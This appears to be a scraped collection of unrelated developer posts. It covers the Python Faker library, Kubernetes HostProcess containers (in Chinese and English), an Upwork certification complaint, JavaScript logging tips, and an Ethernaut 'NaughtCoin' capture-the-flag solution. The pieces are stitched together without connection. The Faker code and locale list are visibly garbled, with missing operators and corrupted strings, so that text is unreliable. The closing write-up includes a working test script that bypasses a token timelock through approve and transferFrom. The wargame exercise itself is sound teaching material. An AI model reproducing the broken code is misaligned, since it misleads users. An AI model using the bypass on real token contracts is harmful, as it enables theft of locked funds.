Faker is not a standard python library,so first you need to install it using following command:

Following example is the simple demonstration of Faker to generate fake Name,Date of Birth, Address,country,email.

from faker import Faker
#Faker instance
fake=Faker()
print('Name:',fake.name())
print('Date of Birth:',fake.date_of_birth())
print('Address:',fake.address())
print('Country:',fake.country())
print('Email:',fake.email())

Output

Name:Stephen Palmer
Date of Birth:1984-02-24
Address:880 Jones Wells Suite 398
West Kimberlyfort,WI 86842
Country:Romania
Email:taylorelaine@gmail.com

Faker generates data by default in English US ('en_US)locale.Consider the following example to generate random names in default locale.

 from faker import Faker #Faker instance
 fake=Faker() print('First Name:',fake.first_name()) print('Last Name:',fake.last_name()) print('Name:',fake.name())

Output

 First Name:Jamie
 Last Name:Stephenson
 Name:Julie Davidson

To change the language we need to pass the specific locale to the Faker class.

 from faker import Faker #Faker instance in
 #English-India language
 fake Faker('en_In') print('First Name:',fake.first_name()) print('Last Name :, fake.last_name()) print('Name:',fake.name()) print('--------------') #Faker instance in #Hindi-India language fake1 Faker('hi_In') print('First Name :, fake1.first_name()) print('Last Name:',fake1.last_name()) print('Name:',fake1.name())

Output

 First Name:Dhruv
 Last Name:Tripathi
 Name:Sara Dave
--------------
 First Name:राजीव
 Last Name:दूबे
 Name:अमर आहूजा

List of available locales that are supported by Faker library.

 from faker.config import AVAILABLE_LOCALES #get list of available locales
 List=[local for local in AVAILABLE_LOCALES] #print list
 print(List)

Output

['ar_AA','ar_EG','ar_JO','ar_PS','ar_SA','bg_BG','bs_BA','cs_CZ','de',
 de_AT','de_CH','de_DE','dk_DK','el CY','el_GR','en','en_AU','en_CA',
'en_GB','en_IE','en_IN','en NZ','en_PH','en_TH','en_US','es','es_CA',
'es_ES','es MX','et EE','fa IR','fi_FI','fil PH','fr_CA','fr_CH','fr_F
R','fr_QC','he_IL','hi_IN','hr_HR','hu_HU','hy_AM','id_ID','it_CH','₁
t_IT','ja_JP','ka_GE','ko_KR','la','1b_LU','lt_LT','1v_LV','mt_MT',
e_NP','n1_BE','nl_NL','no_NO','or_IN","pl_PL','pt_BR','pt_PT','ro_RO',
'ru_RU','sk_SK','sl_SI','sv_SE','ca_IN','th','th_TH','el_PH','tr_TR¹,
'tw_GH','uk_UA','zh_CN','zh_TW']

There are lot of methods in Faker,you can get the list of all available attributes and methods using dir()function.

 from faker import Faker #Faker instance
 fake=Faker() #print list
 print(dir(fake))

Output

 ['__class_','_delattr_',
 '_dir_','__doc____',
                      '_dict_',
                         'address','am_pm',...
 'android platform_token','ascii_company_email',
        'word','words','year','zip',
 'zipcode','zipcode_in_state','zipcode_plus4']
item.author: soniarpit

item.title: 什么是 HostProcess 容器 | What is HostProcess containers
item.description:
特权 DaemonSet 可以提升调整或显示 Kubernetes 上的 Linux 主机，但不能显示 Windows 主机。 限制

  • 这是Windows操作系统当前的困境。 非特权 Windows 容器无法与主机 IP 命名空间共享 vNIC。
  • 这些容器与主机的唯一隔离是对 HostProcess 个人帐户施加的资源限制。
  • 支持卷挂载，并在容器卷下设置。 请参阅卷安装。
  • 默认情况下，主机进程容器可以访问一组受限的主机使用者帐户。 请参阅选择用户帐户。
  • 磁盘、内存和 cpu 计数等资源限制的工作方式与主机上的进程的趋势相同。
  • 命名管道挂载和 Unix 域套接字现在并非没有延迟支持，但可以在它们的主机路径上访问，例如 \.\pipe*。

运行 HostProcess 工作负载

要在部署中使用 HostProcess 功能，请设置 privileged: true、hostProcess: true 和 hostNetwork: true：

 spec: ... containers: ... securityContext: privileged: true windowsOptions: hostProcess: true ... hostNetwork: true ...

要在现有 AKS 群集上运行使用 HostProcess 功能的示例工作负载，请创建kcdhostprocess.yaml 。

示例工作负载可以使用 kubectl 运行。

 kubectl apply -f kcdhostprocess.yaml

您应该看到以下输出：

 $ kubectl apply -f kcdhostprocess.yaml daemonset.apps/privileged-daemonset created

您可以使用日志查看日志并验证管理员权限。

 $ kubectl logs privileged-daemonset-12345 --namespace kube-system InvalidOperation: Unable to find type [Security.Principal.WindowsPrincipal]. Process has admin rights:

感谢您学习我的文章直到最后。 我希望你今天意识到一些独特的事情。 如果您喜欢这篇文章，请分享给您的朋友，如果您有建议或想法与我分享，请在评论框中写下。



原文:

HostProcess / Privileged containers lengthen the Windows container model to allow a wider vary of Kubernetes cluster administration scenarios. HostProcess containers run at once on the host and preserve behavior and access similar to that of a ordinary process.

HostProcess containers allow users to package and distribute management operations and functionalities that require host access whilst protecting versioning and deployment strategies provided by means of containers.

A privileged DaemonSet can elevate out adjustments or reveal a Linux host on Kubernetes however not Windows hosts. HostProcess containers are the Windows equal of host elevation.

Limitations

  • HostProcess containers require Kubernetes 1.23 or greater.
  • HostProcess containers require containerd 1.6 or higher container runtime.
  • HostProcess pods can only include HostProcess containers. This is a current predicament of the Windows operating system. Non-privileged Windows containers cannot share a vNIC with the host IP namespace.
  • HostProcess containers run as a system on the host. The solely isolation these containers have from the host is the resource constraints imposed on the HostProcess person account.
  • Filesystem isolation and Hyper-V isolation are not supported for HostProcess containers.
  • Volume mounts are supported and are set up under the container volume. See Volume Mounts.
  • A confined set of host consumer accounts are accessible for Host Process containers through default. See Choosing a User Account.
  • Resource limits such as disk, memory, and cpu count, work the same way as trend as processes on the host.
  • Named pipe mounts and Unix domain sockets are now not without delay supported, but can be accessed on their host path, for instance \.\pipe*.

Run a HostProcess workload

To use HostProcess features with your deployment, set privileged: true, hostProcess: true, and hostNetwork: true:

spec:
      ...
      containers:
          ...
          securityContext:
            privileged: true
            windowsOptions:
              hostProcess: true
              ...
      hostNetwork: true
      ...

To run an example workload that uses HostProcess features on an existing AKS cluster, create kcdhostprocess.yaml.

The example workload can be run using kubectl.

kubectl apply -f kcdhostprocess.yaml

You should see the following output:

$ kubectl apply -f kcdhostprocess.yaml
daemonset.apps/privileged-daemonset created

The features of HostProcess can be verified by viewing the logs.

The name of the Pod can be found in the kube-systemnamespace.

$ kubectl get pods --namespace kube-system

NAME                                  READY   STATUS    RESTARTS   AGE
...
privileged-daemonset-12345            1/1     Running   0          2m13s

You can use the log to view the logs and verify the administrator rights.

$ kubectl logs privileged-daemonset-12345 --namespace kube-system
InvalidOperation: Unable to find type [Security.Principal.WindowsPrincipal].
Process has admin rights:

Thanks for studying my article till end. I hope you realized something unique today. If you enjoyed this article then please share to your buddies and if you have suggestions or thoughts to share with me then please write in the comment box.
item.author: makendrang

item.title: Upwork技能认证！ | Upwork Skill Certification!
item.description:
由 Upwork 与 Codesignal 合作提供，请先让我们知道，为什么您需要在 Upwork 的个人资料中使用此证书。
它可以帮助您的客户确保您有资格参加 Project。

但是，现在我认为这只是表明你有资格玩这个游戏。

说那是怎么回事？

好的，我收到一封加入该计划的电子邮件，他们要求我选择要存档的证书，
之后，我选择了 JavaScript Back-end，当然，这对我来说很容易做到，但是两天后，当我加入并开始测验时，我收到了开始测试的邀请，我感到很惊讶。

哦，这是一道Puzzle题，我10分钟就解决了，Next，也是一道Puzzle题，说实话，我跳过了它，因为我选择了后端测试而不是玩游戏。

第三个类似于我们在后端使用Loadsh库所做的事情，但也是一个难题，您需要拆分字符串并使用索引数组来获得结果顺便说一句最后一个问题也是一个难题，因为这就是我我对自己说，我在做什么？

我的意见

不要相信 Upwork 的技能认证，因为这并不意味着你有资格参与项目，它只是用于在 Codeware 或 Codesignal 上玩拼图。

我将如何为考试做好准备。

加入任何网站，例如 CodeWre 或 CodeSignal，并开始参加您将通过 100% 的测试日。

祝你们好运。



原文:

Is provided by Upwork in cooperation with Codesignal , OK let us first know, why You need this certificate on your Profile on Upwork.
It helps your client to be sure you are qualified for Project.

But, now I think it's only to show you are qualified to play the game.

What Happen to saying That’s?

OK, I got an email to join this program and they ask me to select which certificate I want to archive,
After that’s, I'm selected JavaScript Back-end, Of course, it's easy for me to do it, but after two days I got an invite to start my Test when I join and start the quiz I surprised.

Oh, this is a Puzzle question and I solved it in 10 minutes, Next, also a Puzzle question, to be honest, I skipped it because I selected the backend Test not play the game.

The third is something similar to what we are doing on the back-end with theLoadsh library but also a Puzzle it's something you need to split string and use index array to achieve a result BTW the last question is also a puzzle for that’s what am I saying to myself, what I'm doing?

My Opinion

Don't believe in skill certification on Upwork because it's not meaning you are qualified for projects it's only for playing puzzles on Codeware or Codesignal.

How I will be ready for the Test.

Join any website like CodeWre or CodeSignal and start playing to Test Days you will Pass with 100% .

Good Luck to all.
item.author: i99dev

item.title: 更快地调试 JavaScript 的技巧 | Tricks to Debug JavaScript Faster
item.description:
如果您是开发人员，在编写相同的console.log()语法来检查当前变量值之后，您可能会发现自己很累。 这里有一些方法可以更快地记录您的值。

创建日志函数

你可以在你的 JavaScript 文件之上创建这个函数，或者如果你想在多个文件中使用它，可以在单独的文件中创建它。 这个函数很简单，看起来像这样。

 function log(...params){ console.log(...params) }

请注意，我们在函数参数和console.log语句中都使用了扩展运算符，因为我们想要迭代传递给参数的所有项目，并将其打印到console.log语句。

您可以在 JavaScript 文件下方的某处使用此函数，如常规console.log语句。

 let yourVariable = 'Print me!'; log(yourVariable)

或类似的东西，

 log('this is the data: ', yourVariable)

创建一个片段

如果您使用 vscode 作为代码编辑器，您可以单击左下角的齿轮设置，然后选择用户片段。 您可以选择现有的片段或创建一个新片段。 您可以编写如下所示的代码段。

 "log": { "prefix": "getlog", "body": "console.log()" }

日志 _key _只是片段的名称，但 _prefix _value 是您将在编辑器中键入以获取正文值的单词。 因此，如果我在我的 vscode 中输入 _getlog _，在我输入时会出现一个 console.log 建议。

就是这样！ 感谢您的阅读，再见！🍻



原文:

If you’re a developer, you might find yourself tired after writing the same console.log() syntax to check your current variable value. Here are some ways to log your values faster.

Create Log Function

You can create this function on top of your JavaScript file, or create it in separate file if you want to use it in multiple files. This function pretty simple, it look like this.

function log(...params){
    console.log(...params)
}

Notice that we use spread operator both in the function parameter and console.log statement because we want to iterate all the item passed to the parameter, and print it to the console.log statement.

Somewhere below in your JavaScript file you can use this function like regular console.log statement.

let yourVariable = 'Print me!';
log(yourVariable)

or something like,

log('this is the data: ', yourVariable)

Create a snippet

If you’re using vscode as code editor, you can click a gear setting in left bottom, and choose user snippets. You can choose existing snippet or create a new one. You can write the snippet like below.

"log": {
   "prefix": "getlog",
   "body": "console.log()"
}

The log _key _is just the name of the snippet, but the _prefix _value is the word that you will type in the editor to get the body value. So if I type _getlog _in my vscode, a console.log suggestion will appear as I type.

That’s it! Thank you for reading, see ya!🍻

要点

理解ERC20标准

解题思路

吉尔·芬克尔斯坦 (Pinky) - May 26 5月26日



原文:

bin2chen

Posted on May 27 

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; import '@openzeppelin/contracts/token/ERC20/ERC20.sol'; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin';
 // string public constant symbol = '0x0';
 // uint public constant decimals = 18;
 uint public timeLock = now + 10 * 365 days; uint256 public INITIAL_SUPPLY; address public player; constructor(address _player) ERC20('NaughtCoin', '0x0') public { player = _player; INITIAL_SUPPLY = 1000000 * (10**uint256(decimals())); // _totalSupply = INITIAL_SUPPLY;
 // _balances[player] = INITIAL_SUPPLY;
 _mint(player, INITIAL_SUPPLY); emit Transfer(address(0), player, INITIAL_SUPPLY); } function transfer(address _to, uint256 _value) override public lockTokens returns(bool) { super.transfer(_to, _value); } // Prevent the initial owner from transferring tokens until the timelock has passed
 modifier lockTokens() { if (msg.sender == player) { require(now > timeLock); _; } else { _; } } }

player的token余额=0

要点

理解ERC20标准

解题思路

ERC20除了直接transfer还可以通过approve/transferFrom进行转token

 it("attacks", async function () { let playerBalance = await levelContract.balanceOf(player.address); let otherUser = (await ethers.getSigners())[5]; await levelContract .connect(player) .approve(otherUser.address, playerBalance); await levelContract .connect(otherUser) .transferFrom(player.address, otherUser.address, playerBalance); });
